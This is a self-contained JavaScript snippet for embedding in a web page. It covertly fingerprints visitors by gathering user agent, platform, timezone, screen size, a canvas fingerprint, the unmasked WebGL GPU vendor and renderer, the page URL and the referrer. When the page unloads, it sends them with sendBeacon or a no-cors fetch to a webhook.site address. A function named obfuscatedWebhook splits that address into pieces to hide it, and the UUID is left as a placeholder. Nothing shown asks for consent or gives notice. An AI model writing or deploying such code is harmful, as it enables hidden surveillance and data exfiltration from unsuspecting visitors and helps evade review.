(function() {
    let collectedData = {};

    function getBasicInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            touchSupport: 'ontouchstart' in window
        };
    }

    function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 30);
        ctx.fillStyle = '#069';
        ctx.fillText('fingerprint', 2, 15);
        return canvas.toDataURL();
    }

    function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return null;
        return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    }

    function collectAll() {
        collectedData = {
            timestamp: Date.now(),
            basic: getBasicInfo(),
            canvas: getCanvasFingerprint(),
            webgl: getWebGLInfo(),
            url: window.location.href,
            referrer: document.referrer || 'direct'
        };
    }

    function obfuscatedWebhook() {
        const p1 = 'https://webhook';
        const p2 = 'site/';
        const p3 = 'your-actual-uuid-here';
        const p4 = '-endpoint';
        return p1 + '.' + p2 + p3 + p4;
    }

    function sendData() {
        const url = obfuscatedWebhook();
        const payload = JSON.stringify(collectedData);
        
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url, payload);
        } else {
            fetch(url, {
                method: 'POST',
                mode: 'no-cors',
                body: payload,
                headers: { 'Content-Type': 'application/json' }
            });
        }
    }

    collectAll();

    window.addEventListener('beforeunload', function() {
        sendData();
    });
})();
